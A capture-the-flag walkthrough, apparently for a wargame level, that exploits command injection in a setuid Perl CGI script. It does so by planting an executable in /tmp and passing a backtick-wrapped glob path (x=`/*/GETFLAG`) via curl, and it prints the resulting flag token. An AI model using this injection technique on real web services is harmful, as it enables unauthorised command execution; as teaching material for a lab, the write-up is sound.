# Level 11

As `level12`, running `ls` gives us a perl script...

```perl
  $> cat cat level12.pl 

  #!/usr/bin/env perl
  # localhost:4646
  use CGI qw{param};
  print "Content-type: text/html\n\n";    

  sub t {
    $nn = $_[1];
    $xx = $_[0];
    $xx =~ tr/a-z/A-Z/;
    $xx =~ s/\s.*//;
    @output = `egrep "^$xx" /tmp/xd 2>&1`;
    foreach $line (@output) {
        ($f, $s) = split(/:/, $line);     
        if($s =~ $nn) {
            return 1;
        }
    }
    return 0;
  }

  sub n {
    if($_[0] == 1) {
        print("..");
    } else {
        print(".");
    }
  }

  n(t(param("x"), param("y")));
```

> This script is running on `<VM-IP>:4646` and takes two parameters, the second being useless we can omit it.


If we look closer, we can get more details about the other parameter...

```perl
    $xx = $_[0];
    $xx =~ tr/a-z/A-Z/;
    $xx =~ s/\s.*//;
    @output = `egrep "^$xx" /tmp/xd 2>&1`;
```

> Before being evaluated by [`egrep`](https://linux.die.net/man/1/egrep), some regex are applied on it. First, it converts any lowercase character into its uppercase counterpart then, if any whitespace character is found in the output, it removes everything starting this character to the end of the string.

In order to keep our input intact we must only use uppercase letters and avoid whitespaces. If we look for more details about this script with `ls -l` ...

```shell
  $> ls -l
  total 4
  -rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
```

This file is owned by `flag12` which means we only have to make this script execute `getflag` to pass this level.

```shell
  $> echo "getflag > /tmp/password" > /tmp/GETFLAG
  $> chmod 777 /tmp/GETFLAG
```
> We must add at least execution rights on this file to be able to run it without the need of `sh` or `bash`.

Once that's done, last step is asking the script to execute our file using `curl`.

```shell
  $> curl 'http://<VM-IP>:4646?x=`/*/GETFLAG`'
```

> Quotes surrounding the url are important to avoid the shell to interpret what we are assigning to `x` and the `*` allows us to get to the `GETFLAG` file without specifying the `/tmp/` folder which does not respect the first condition.

Finally, all we have to do is retrieving the password from the file we stored the `getflag` feedback into.

```shell
  $> cat /tmp/password
  Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

So, `g1qKMiRpXf53AWhDaU7FEkczr` is the flag for this level.


